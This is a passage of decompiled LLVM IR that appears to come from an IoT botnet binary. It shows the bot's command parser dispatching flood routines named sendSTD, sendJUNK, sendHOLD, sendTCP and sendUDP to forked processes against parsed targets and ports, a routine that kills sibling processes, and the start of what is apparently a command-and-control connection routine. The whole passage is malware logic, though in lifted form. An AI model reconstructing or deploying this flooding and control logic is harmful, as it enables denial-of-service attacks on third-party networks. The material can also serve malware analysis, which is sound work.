  %v2_126e4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_126e4, i32* @r0, align 4
  %v2_126f4 = icmp eq i32 %v2_126e4, 0
  br i1 %v2_126f4, label %dec_label_pc_12748, label %dec_label_pc_12684

dec_label_pc_12700:                               ; preds = %dec_label_pc_12604
  %v0_12700 = call i32 @listFork()
  %v2_12708 = icmp eq i32 %v0_12700, 0
  br i1 %v2_12708, label %dec_label_pc_12710, label %dec_label_pc_12d38

dec_label_pc_12710:                               ; preds = %dec_label_pc_12700
  %v4_1271c = call i32 @sendJUNK(i32 %v2_1260c, i32 %v1_12624, i32 %v1_12640, i32 0)
  %v3_1272c = call i32 @sendSTD(i32 %v2_1260c, i32 %v1_12624, i32 %v1_12640)
  %v3_1273c = call i32 @sendHOLD(i32 %v2_1260c, i32 %v1_12624, i32 %v1_12640)
  %v1_12744 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12748

dec_label_pc_12748:                               ; preds = %dec_label_pc_126dc, %dec_label_pc_12668, %dec_label_pc_12594, %dec_label_pc_12710
  %v2_1274c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228cc.808 to i32), i32* @r1, align 4
  %v3_12758 = inttoptr i32 %v2_1274c to i8*
  %v4_12758 = call i32 @__GI_strcoll(i8* %v3_12758, i32 ptrtoint ([4 x i8]* @global_var_228cc.808 to i32))
  %v2_12760 = icmp eq i32 %v4_12758, 0
  br i1 %v2_12760, label %dec_label_pc_12768, label %dec_label_pc_128ac

dec_label_pc_12768:                               ; preds = %dec_label_pc_12748
  %v7_12770 = icmp slt i32 %arg1, 4
  br i1 %v7_12770, label %dec_label_pc_12d38, label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_12768
  %v1_12778 = add i32 %tmp, 8
  %v1_1277c = inttoptr i32 %v1_12778 to i32*
  %v2_1277c = load i32, i32* %v1_1277c, align 4
  store i32 %v2_1277c, i32* @r0, align 4
  %v1_12784 = call i32 @atol(i32 %v2_1277c)
  %tmp119 = icmp slt i32 %v1_12784, 1
  br i1 %tmp119, label %dec_label_pc_12d38, label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12774
  %v1_12798 = add i32 %tmp, 12
  %v1_1279c = inttoptr i32 %v1_12798 to i32*
  %v2_1279c = load i32, i32* %v1_1279c, align 4
  store i32 %v2_1279c, i32* @r0, align 4
  %v1_127a4 = call i32 @atol(i32 %v2_1279c)
  %v5_127b0 = icmp sgt i32 %v1_127a4, 0
  br i1 %v5_127b0, label %dec_label_pc_127b8, label %dec_label_pc_12d38

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12794
  %v1_127bc = add i32 %tmp, 4
  %v1_127c0 = inttoptr i32 %v1_127bc to i32*
  %v2_127c0 = load i32, i32* %v1_127c0, align 4
  %v2_127d0 = load i32, i32* %v1_1277c, align 4
  store i32 %v2_127d0, i32* @r0, align 4
  %v1_127d8 = call i32 @atol(i32 %v2_127d0)
  %v2_127ec = load i32, i32* %v1_1279c, align 4
  store i32 %v2_127ec, i32* @r0, align 4
  %v1_127f4 = call i32 @atol(i32 %v2_127ec)
  store i32 %v2_127c0, i32* @r0, align 4
  %v2_1280c = call i32 @__GI_strchr(i32 %v2_127c0, i32 44)
  store i32 %v2_1280c, i32* @r0, align 4
  %v2_12814 = icmp eq i32 %v2_1280c, 0
  br i1 %v2_12814, label %dec_label_pc_12884, label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_127b8
  %v2_12828 = call i32 @__GI_strtok(i32 %v2_127c0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12828, i32* @r0, align 4
  %v2_1287833 = icmp eq i32 %v2_12828, 0
  br i1 %v2_1287833, label %dec_label_pc_128ac, label %dec_label_pc_12838

dec_label_pc_12838:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_12860
  %storemerge1634 = phi i32 [ %v2_12868, %dec_label_pc_12860 ], [ %v2_12828, %dec_label_pc_1281c ]
  %v0_12838 = call i32 @listFork()
  %v2_12840 = icmp eq i32 %v0_12838, 0
  br i1 %v2_12840, label %dec_label_pc_12848, label %dec_label_pc_12860

dec_label_pc_12848:                               ; preds = %dec_label_pc_12838
  %v3_12854 = call i32 @sendSTD(i32 %storemerge1634, i32 %v1_127d8, i32 %v1_127f4)
  %v1_1285c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_12838, %dec_label_pc_12848
  %v2_12868 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12868, i32* @r0, align 4
  %v2_12878 = icmp eq i32 %v2_12868, 0
  br i1 %v2_12878, label %dec_label_pc_128ac, label %dec_label_pc_12838

dec_label_pc_12884:                               ; preds = %dec_label_pc_127b8
  %v0_12884 = call i32 @listFork()
  %v2_1288c = icmp eq i32 %v0_12884, 0
  br i1 %v2_1288c, label %dec_label_pc_12894, label %dec_label_pc_12d38

dec_label_pc_12894:                               ; preds = %dec_label_pc_12884
  %v3_128a0 = call i32 @sendSTD(i32 %v2_127c0, i32 %v1_127d8, i32 %v1_127f4)
  %v1_128a8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_128ac

dec_label_pc_128ac:                               ; preds = %dec_label_pc_12860, %dec_label_pc_1281c, %dec_label_pc_12748, %dec_label_pc_12894
  %v2_128b0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228d0.810 to i32), i32* @r1, align 4
  %v3_128bc = inttoptr i32 %v2_128b0 to i8*
  %v4_128bc = call i32 @__GI_strcoll(i8* %v3_128bc, i32 ptrtoint ([4 x i8]* @global_var_228d0.810 to i32))
  %v2_128c4 = icmp eq i32 %v4_128bc, 0
  br i1 %v2_128c4, label %dec_label_pc_128cc, label %dec_label_pc_12bf8

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128ac
  %v7_128d4 = icmp slt i32 %arg1, 6
  br i1 %v7_128d4, label %dec_label_pc_12d38, label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128cc
  %v1_128dc = add i32 %tmp, 12
  %v1_128e0 = inttoptr i32 %v1_128dc to i32*
  %v2_128e0 = load i32, i32* %v1_128e0, align 4
  store i32 %v2_128e0, i32* @r0, align 4
  %v1_128e8 = call i32 @atol(i32 %v2_128e0)
  %v7_128f0 = icmp eq i32 %v1_128e8, -1
  br i1 %v7_128f0, label %dec_label_pc_12d38, label %dec_label_pc_128f8

dec_label_pc_128f8:                               ; preds = %dec_label_pc_128d8
  %v1_128fc = add i32 %tmp, 8
  %v1_12900 = inttoptr i32 %v1_128fc to i32*
  %v2_12900 = load i32, i32* %v1_12900, align 4
  store i32 %v2_12900, i32* @r0, align 4
  %v1_12908 = call i32 @atol(i32 %v2_12900)
  %v7_12910 = icmp eq i32 %v1_12908, -1
  br i1 %v7_12910, label %dec_label_pc_12d38, label %dec_label_pc_12918

dec_label_pc_12918:                               ; preds = %dec_label_pc_128f8
  %v1_1291c = add i32 %tmp, 16
  %v1_12920 = inttoptr i32 %v1_1291c to i32*
  %v2_12920 = load i32, i32* %v1_12920, align 4
  store i32 %v2_12920, i32* @r0, align 4
  %v1_12928 = call i32 @atol(i32 %v2_12920)
  %v7_12930 = icmp eq i32 %v1_12928, -1
  br i1 %v7_12930, label %dec_label_pc_12d38, label %dec_label_pc_12938

dec_label_pc_12938:                               ; preds = %dec_label_pc_12918
  %v2_12940 = load i32, i32* %v1_12920, align 4
  store i32 %v2_12940, i32* @r0, align 4
  %v1_12948 = call i32 @atol(i32 %v2_12940)
  %v8_12954 = icmp sgt i32 %v1_12948, 32
  br i1 %v8_12954, label %dec_label_pc_12d38, label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %dec_label_pc_12938
  %v7_12960 = icmp slt i32 %arg1, 7
  br i1 %v7_12960, label %dec_label_pc_12984, label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_12958
  %v1_12968 = add i32 %tmp, 24
  %v1_1296c = inttoptr i32 %v1_12968 to i32*
  %v2_1296c = load i32, i32* %v1_1296c, align 4
  store i32 %v2_1296c, i32* @r0, align 4
  %v1_12974 = call i32 @atol(i32 %v2_1296c)
  %v1_1297c = icmp slt i32 %v1_12974, 0
  br i1 %v1_1297c, label %dec_label_pc_12d38, label %dec_label_pc_12984

dec_label_pc_12984:                               ; preds = %dec_label_pc_12964, %dec_label_pc_12958
  %v7_12988 = icmp eq i32 %arg1, 8
  br i1 %v7_12988, label %dec_label_pc_12990, label %dec_label_pc_12a30

dec_label_pc_12990:                               ; preds = %dec_label_pc_12984
  %v1_12994 = add i32 %tmp, 28
  %v1_12998 = inttoptr i32 %v1_12994 to i32*
  %v2_12998 = load i32, i32* %v1_12998, align 4
  store i32 %v2_12998, i32* @r0, align 4
  %v1_129a0 = call i32 @atol(i32 %v2_12998)
  %v5_129ac = icmp sgt i32 %v1_129a0, 0
  br i1 %v5_129ac, label %dec_label_pc_12a30, label %dec_label_pc_12d38

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12984, %dec_label_pc_12990
  %v1_12a34 = add i32 %tmp, 4
  %v1_12a38 = inttoptr i32 %v1_12a34 to i32*
  %v2_12a38 = load i32, i32* %v1_12a38, align 4
  %v2_12a48 = load i32, i32* %v1_12900, align 4
  store i32 %v2_12a48, i32* @r0, align 4
  %v1_12a50 = call i32 @atol(i32 %v2_12a48)
  %v2_12a64 = load i32, i32* %v1_128e0, align 4
  store i32 %v2_12a64, i32* @r0, align 4
  %v1_12a6c = call i32 @atol(i32 %v2_12a64)
  %v2_12a80 = load i32, i32* %v1_12920, align 4
  store i32 %v2_12a80, i32* @r0, align 4
  %v1_12a88 = call i32 @atol(i32 %v2_12a80)
  %v1_12a98 = add i32 %tmp, 20
  %v1_12a9c = inttoptr i32 %v1_12a98 to i32*
  %v2_12a9c = load i32, i32* %v1_12a9c, align 4
  br i1 %v7_12988, label %dec_label_pc_12ab0, label %dec_label_pc_12acc

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12a30
  %v1_12ab4 = add i32 %tmp, 28
  %v1_12ab8 = inttoptr i32 %v1_12ab4 to i32*
  %v2_12ab8 = load i32, i32* %v1_12ab8, align 4
  store i32 %v2_12ab8, i32* @r0, align 4
  %v1_12ac0 = call i32 @atol(i32 %v2_12ab8)
  br label %dec_label_pc_12ad4

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12a30
  br label %dec_label_pc_12ad4

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12ab0, %dec_label_pc_12acc
  %storemerge3 = phi i32 [ 10, %dec_label_pc_12acc ], [ %v1_12ac0, %dec_label_pc_12ab0 ]
  br i1 %v7_12960, label %dec_label_pc_12b04, label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ad4
  %v1_12aec = add i32 %tmp, 24
  %v1_12af0 = inttoptr i32 %v1_12aec to i32*
  %v2_12af0 = load i32, i32* %v1_12af0, align 4
  store i32 %v2_12af0, i32* @r0, align 4
  %v1_12af8 = call i32 @atol(i32 %v2_12af0)
  br label %dec_label_pc_12b0c

dec_label_pc_12b04:                               ; preds = %dec_label_pc_12ad4
  br label %dec_label_pc_12b0c

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12ae8, %dec_label_pc_12b04
  %storemerge2 = phi i32 [ 0, %dec_label_pc_12b04 ], [ %v1_12af8, %dec_label_pc_12ae8 ]
  store i32 %v2_12a38, i32* @r0, align 4
  %v2_12b20 = call i32 @__GI_strchr(i32 %v2_12a38, i32 44)
  store i32 %v2_12b20, i32* @r0, align 4
  %v2_12b28 = icmp eq i32 %v2_12b20, 0
  br i1 %v2_12b28, label %dec_label_pc_12bb4, label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b0c
  %v2_12b3c = call i32 @__GI_strtok(i32 %v2_12a38, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12b3c, i32* @r0, align 4
  %v2_12ba830 = icmp eq i32 %v2_12b3c, 0
  br i1 %v2_12ba830, label %dec_label_pc_12bf8, label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12b30, %dec_label_pc_12b90
  %storemerge1431 = phi i32 [ %v2_12b98, %dec_label_pc_12b90 ], [ %v2_12b3c, %dec_label_pc_12b30 ]
  %v0_12b4c = call i32 @listFork()
  %v2_12b54 = icmp eq i32 %v0_12b4c, 0
  br i1 %v2_12b54, label %dec_label_pc_12b5c, label %dec_label_pc_12b90

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b4c
  %v7_12b84 = call i32 @sendTCP(i32 %storemerge1431, i32 %v1_12a50, i32 %v1_12a6c, i32 %v1_12a88, i32 %v2_12a9c, i32 %storemerge2, i32 %storemerge3)
  %v1_12b8c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b4c, %dec_label_pc_12b5c
  %v2_12b98 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12b98, i32* @r0, align 4
  %v2_12ba8 = icmp eq i32 %v2_12b98, 0
  br i1 %v2_12ba8, label %dec_label_pc_12bf8, label %dec_label_pc_12b4c

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12b0c
  %v0_12bb4 = call i32 @listFork()
  %v2_12bbc = icmp eq i32 %v0_12bb4, 0
  br i1 %v2_12bbc, label %dec_label_pc_12bc4, label %dec_label_pc_12d38

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12bb4
  %v7_12bec = call i32 @sendTCP(i32 %v2_12a38, i32 %v1_12a50, i32 %v1_12a6c, i32 %v1_12a88, i32 %v2_12a9c, i32 %storemerge2, i32 %storemerge3)
  %v1_12bf4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12bf8

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12b90, %dec_label_pc_12b30, %dec_label_pc_128ac, %dec_label_pc_12bc4
  %v2_12bfc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_228d4.812 to i32), i32* @r1, align 4
  %v3_12c08 = inttoptr i32 %v2_12bfc to i8*
  %v4_12c08 = call i32 @__GI_strcoll(i8* %v3_12c08, i32 ptrtoint ([5 x i8]* @global_var_228d4.812 to i32))
  store i32 %v4_12c08, i32* @r0, align 4
  %v2_12c10 = icmp eq i32 %v4_12c08, 0
  br i1 %v2_12c10, label %dec_label_pc_12c18, label %dec_label_pc_12d10

dec_label_pc_12c18:                               ; preds = %dec_label_pc_12bf8
  br label %dec_label_pc_12cbc

dec_label_pc_12c2c:                               ; preds = %dec_label_pc_12cbc, %dec_label_pc_12cf0
  %v3_12c30 = mul i32 %storemerge12, 4
  %v2_12c3c = load i32, i32* @global_var_32850.59, align 4
  %v2_12c40 = add i32 %v2_12c3c, %v3_12c30
  %v1_12c44 = inttoptr i32 %v2_12c40 to i32*
  %v2_12c44 = load i32, i32* %v1_12c44, align 4
  %v2_12c48 = icmp eq i32 %v2_12c44, 0
  br i1 %v2_12c48, label %dec_label_pc_12cb0, label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12c2c
  %v2_12c68 = load i32, i32* %v1_12c44, align 4
  %v0_12c6c = call i32 @__GI_getpid()
  store i32 %v0_12c6c, i32* @r0, align 4
  %v9_12c74 = icmp eq i32 %v2_12c68, %v0_12c6c
  br i1 %v9_12c74, label %dec_label_pc_12cb0, label %dec_label_pc_12c7c

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c50
  %v2_12c8c = load i32, i32* @global_var_32850.59, align 4
  %v2_12c90 = add i32 %v2_12c8c, %v3_12c30
  %v1_12c94 = inttoptr i32 %v2_12c90 to i32*
  %v2_12c94 = load i32, i32* %v1_12c94, align 4
  %v2_12ca0 = call i32 @kill(i32 %v2_12c94, i32 9)
  store i32 %v2_12ca0, i32* @r0, align 4
  %v1_12ca8 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %dec_label_pc_12c50, %dec_label_pc_12c2c, %dec_label_pc_12c7c
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_12c2c ], [ %stack_var_-48.1, %dec_label_pc_12c50 ], [ %v1_12ca8, %dec_label_pc_12c7c ]
  %v1_12cb4 = add i32 %storemerge12, 1
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c18, %dec_label_pc_12cb0
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_12c18 ], [ %stack_var_-48.0, %dec_label_pc_12cb0 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_12c18 ], [ %v1_12cb4, %dec_label_pc_12cb0 ]
  %v5_12cd4 = load i32, i32* @global_var_2c5f4.57, align 4
  %v9_12ce8 = icmp eq i32 %v5_12cd4, 0
  br i1 %v9_12ce8, label %dec_label_pc_12cf0, label %dec_label_pc_12c2c

dec_label_pc_12cf0:                               ; preds = %dec_label_pc_12cbc
  %v2_12cd4 = load i32, i32* @global_var_2c5f0.56, align 4
  %tmp120 = icmp ugt i32 %v2_12cd4, %storemerge12
  br i1 %tmp120, label %dec_label_pc_12c2c, label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12cf0, %dec_label_pc_12bf8
  %v2_12d14 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_228dc.816 to i32), i32* @r1, align 4
  %v3_12d20 = inttoptr i32 %v2_12d14 to i8*
  %v4_12d20 = call i32 @__GI_strcoll(i8* %v3_12d20, i32 ptrtoint ([12 x i8]* @global_var_228dc.816 to i32))
  %v2_12d28 = icmp eq i32 %v4_12d20, 0
  br i1 %v2_12d28, label %dec_label_pc_12d30, label %dec_label_pc_12d38

dec_label_pc_12d30:                               ; preds = %dec_label_pc_12d10
  %v1_12d34 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12d38

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12990, %dec_label_pc_12794, %dec_label_pc_125e0, %dec_label_pc_1246c, %dec_label_pc_12078, %dec_label_pc_11e50, %dec_label_pc_11cec, %dec_label_pc_11ddc, %dec_label_pc_11f50, %dec_label_pc_121ec, %dec_label_pc_12370, %dec_label_pc_1256c, %dec_label_pc_12700, %dec_label_pc_12884, %dec_label_pc_12bb4, %dec_label_pc_12d10, %dec_label_pc_11c50, %dec_label_pc_11be0, %dec_label_pc_12964, %dec_label_pc_12938, %dec_label_pc_12918, %dec_label_pc_128f8, %dec_label_pc_128d8, %dec_label_pc_128cc, %dec_label_pc_12774, %dec_label_pc_12768, %dec_label_pc_125c0, %dec_label_pc_125b4, %dec_label_pc_1244c, %dec_label_pc_12440, %dec_label_pc_12248, %dec_label_pc_1204c, %dec_label_pc_12024, %dec_label_pc_12004, %dec_label_pc_11fe4, %dec_label_pc_11fc4, %dec_label_pc_11fa4, %dec_label_pc_11f98, %dec_label_pc_11e30, %dec_label_pc_11e24, %dec_label_pc_11ccc, %dec_label_pc_11cc0, %dec_label_pc_11b78, %dec_label_pc_11c08, %dec_label_pc_11b3c, %dec_label_pc_11a40, %dec_label_pc_11a08, %dec_label_pc_12d30
  %v1_12d40 = phi i32 [ %v1_129a0, %dec_label_pc_12990 ], [ %v1_127a4, %dec_label_pc_12794 ], [ %v1_125f0, %dec_label_pc_125e0 ], [ %v1_1247c, %dec_label_pc_1246c ], [ %v1_12088, %dec_label_pc_12078 ], [ %v1_11e60, %dec_label_pc_11e50 ], [ %v1_11cfc, %dec_label_pc_11cec ], [ %v0_11ddc, %dec_label_pc_11ddc ], [ %v0_11f50, %dec_label_pc_11f50 ], [ %v0_121ec, %dec_label_pc_121ec ], [ %v0_12370, %dec_label_pc_12370 ], [ %v0_1256c, %dec_label_pc_1256c ], [ %v0_12700, %dec_label_pc_12700 ], [ %v0_12884, %dec_label_pc_12884 ], [ %v0_12bb4, %dec_label_pc_12bb4 ], [ %v4_12d20, %dec_label_pc_12d10 ], [ 0, %dec_label_pc_11c50 ], [ 0, %dec_label_pc_11be0 ], [ %v1_12974, %dec_label_pc_12964 ], [ %v1_12948, %dec_label_pc_12938 ], [ %v1_12928, %dec_label_pc_12918 ], [ %v1_12908, %dec_label_pc_128f8 ], [ %v1_128e8, %dec_label_pc_128d8 ], [ 0, %dec_label_pc_128cc ], [ %v1_12784, %dec_label_pc_12774 ], [ 0, %dec_label_pc_12768 ], [ %v1_125d0, %dec_label_pc_125c0 ], [ 0, %dec_label_pc_125b4 ], [ %v1_1245c, %dec_label_pc_1244c ], [ 0, %dec_label_pc_12440 ], [ 0, %dec_label_pc_12248 ], [ %v1_1205c, %dec_label_pc_1204c ], [ %v1_12034, %dec_label_pc_12024 ], [ %v1_12014, %dec_label_pc_12004 ], [ %v1_11ff4, %dec_label_pc_11fe4 ], [ %v1_11fd4, %dec_label_pc_11fc4 ], [ %v1_11fb4, %dec_label_pc_11fa4 ], [ 0, %dec_label_pc_11f98 ], [ %v1_11e40, %dec_label_pc_11e30 ], [ 0, %dec_label_pc_11e24 ], [ %v1_11cdc, %dec_label_pc_11ccc ], [ 0, %dec_label_pc_11cc0 ], [ 0, %dec_label_pc_11b78 ], [ %v0_11bf0, %dec_label_pc_11c08 ], [ %v3_11b4c, %dec_label_pc_11b3c ], [ %v3_11a64, %dec_label_pc_11a40 ], [ %v3_11a18, %dec_label_pc_11a08 ], [ %v1_12d34, %dec_label_pc_12d30 ]
  store i32 %v3_119d4, i32* @r4, align 4
  store i32 %v6_119d4, i32* @r5, align 4
  store i32 %v9_119d4, i32* @r6, align 4
  store i32 %v12_119d4, i32* @r7, align 4
  store i32 %v15_119d4, i32* @r8, align 4
  store i32 %v18_119d4, i32* @fp, align 4
  ret i32 %v1_12d40

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_12c30, { 1, 0 }
  uselistorder i32 %v2_12b98, { 2, 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_12a88, { 1, 0 }
  uselistorder i32 %v1_12a6c, { 1, 0 }
  uselistorder i32 %v1_12a50, { 1, 0 }
  uselistorder i32 %v2_12a38, { 1, 0, 3, 2 }
  uselistorder i32 %v1_12928, { 1, 0 }
  uselistorder i32 %v1_12908, { 1, 0 }
  uselistorder i32 %v1_128e8, { 1, 0 }
  uselistorder i32 %v2_12868, { 2, 1, 0 }
  uselistorder i32 %v1_127f4, { 1, 0 }
  uselistorder i32 %v1_127d8, { 1, 0 }
  uselistorder i32 %v2_127c0, { 1, 0, 3, 2 }
  uselistorder i32 %v2_126e4, { 2, 1, 0 }
  uselistorder i32 %storemerge1837, { 2, 1, 0 }
  uselistorder i32 %v1_12640, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v1_12624, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_1260c, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_12550, { 2, 1, 0 }
  uselistorder i32 %v1_124cc, { 1, 0 }
  uselistorder i32 %v1_124b0, { 1, 0 }
  uselistorder i32 %v2_12498, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12354, { 1, 0 }
  uselistorder i32* %v1_1225c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_121d0, { 2, 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_120f4, { 1, 0 }
  uselistorder i32 %v1_120d8, { 1, 0 }
  uselistorder i32 %v1_120bc, { 1, 0 }
  uselistorder i32 %v2_120a4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_12014, { 1, 0 }
  uselistorder i32 %v1_11ff4, { 1, 0 }
  uselistorder i32 %v1_11fd4, { 1, 0 }
  uselistorder i32 %v1_11fb4, { 1, 0 }
  uselistorder i32 %v2_11f34, { 2, 1, 0 }
  uselistorder i32 %v1_11eb0, { 1, 0 }
  uselistorder i32 %v1_11e94, { 1, 0 }
  uselistorder i32 %v2_11e7c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11dc0, { 2, 1, 0 }
  uselistorder i32 %v1_11d4c, { 1, 0 }
  uselistorder i32 %v1_11d30, { 1, 0 }
  uselistorder i32 %v2_11d18, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_227dc.748 to i32), { 7, 8, 6, 9, 5, 10, 4, 11, 3, 12, 2, 13, 1, 14, 0, 15, 16, 17 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_2287c.789 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_3284c.785, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1fda4.52 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_12d38, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 26, 27, 11, 3, 28, 29, 10, 30, 9, 4, 31, 32, 33, 34, 35, 36, 37, 8, 5, 38, 39, 7, 6, 40, 41, 16, 43, 17, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_12cbc, { 1, 0 }
  uselistorder label %dec_label_pc_12cb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c2c, { 1, 0 }
  uselistorder label %dec_label_pc_12bf8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12b90, { 1, 0 }
  uselistorder label %dec_label_pc_12b4c, { 1, 0 }
  uselistorder label %dec_label_pc_12b0c, { 1, 0 }
  uselistorder label %dec_label_pc_12ad4, { 1, 0 }
  uselistorder label %dec_label_pc_12a30, { 1, 0 }
  uselistorder label %dec_label_pc_128ac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12860, { 1, 0 }
  uselistorder label %dec_label_pc_12838, { 1, 0 }
  uselistorder label %dec_label_pc_12748, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_126dc, { 1, 0 }
  uselistorder label %dec_label_pc_12684, { 1, 0 }
  uselistorder label %dec_label_pc_12594, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12548, { 1, 0 }
  uselistorder label %dec_label_pc_12510, { 1, 0 }
  uselistorder label %dec_label_pc_12420, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1234c, { 1, 0 }
  uselistorder label %dec_label_pc_1229c, { 1, 0 }
  uselistorder label %dec_label_pc_12228, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_121c8, { 1, 0 }
  uselistorder label %dec_label_pc_1218c, { 1, 0 }
  uselistorder label %dec_label_pc_1214c, { 1, 0 }
  uselistorder label %dec_label_pc_1209c, { 1, 0 }
  uselistorder label %dec_label_pc_11f78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f2c, { 1, 0 }
  uselistorder label %dec_label_pc_11ef4, { 1, 0 }
  uselistorder label %dec_label_pc_11e04, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11db8, { 1, 0 }
  uselistorder label %dec_label_pc_11d90, { 1, 0 }
  uselistorder label %dec_label_pc_11ca0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11bbc, { 1, 0 }
  uselistorder label %dec_label_pc_11b10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ac0, { 2, 0, 1 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12d48 = load i32, i32* @fp, align 4
  store i32 77136, i32* %stack_var_-4, align 4
  %v2_12d4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12d4c, i32* @fp, align 4
  %v2_12d60 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_12d70 = bitcast i32* %stack_var_-4116 to i8*
  %v3_12d70 = call i32 @__GI_memset(i8* %v2_12d70, i32 0)
  %v2_12d78 = load i32, i32* @global_var_2c5e8.50, align 4
  %v2_12d7c = icmp eq i32 %v2_12d78, 0
  br i1 %v2_12d7c, label %dec_label_pc_12da0, label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %entry
  %v1_12d90 = call i32 @__GI_close(i32 %v2_12d78)
  store i32 0, i32* @global_var_2c5e8.50, align 4
  br label %dec_label_pc_12da0

dec_label_pc_12da0:                               ; preds = %entry, %dec_label_pc_12d84
  %v2_12da4 = load i32, i32* @global_var_2c278.819, align 4
